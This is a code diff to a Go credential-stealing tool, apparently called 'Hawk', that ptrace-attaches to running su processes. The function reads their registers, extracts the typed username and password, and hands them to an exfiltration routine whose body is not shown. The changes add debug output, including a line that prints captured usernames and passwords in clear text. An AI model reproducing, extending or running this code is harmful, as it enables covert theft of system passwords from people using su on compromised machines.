@@ -9,11 +9,13 @@ import (
 )
 
 func traceSUProcess(pid int) {
+	fmt.Printf("[Hawk] SU Connection Identified on pid: %d.\n", pid)
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
+		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 		syscall.PtraceDetach(pid)
 	}()
 	var wstatus syscall.WaitStatus
@@ -32,6 +34,7 @@ func traceSUProcess(pid int) {
 		var regs syscall.PtraceRegs
 		ptrace_err := syscall.PtraceGetRegs(pid, &regs)
 		if ptrace_err != nil {
+			fmt.Println("PtraceGetRegs:", ptrace_err)
 			syscall.PtraceDetach(pid)
 			return
 		}
@@ -61,7 +64,7 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
-						fmt.Print("Su Exfil Hit")
+						fmt.Printf("Username: %q, Password %q\n", username, password)
 						go exfil_password(username, password)
 					}
 				}
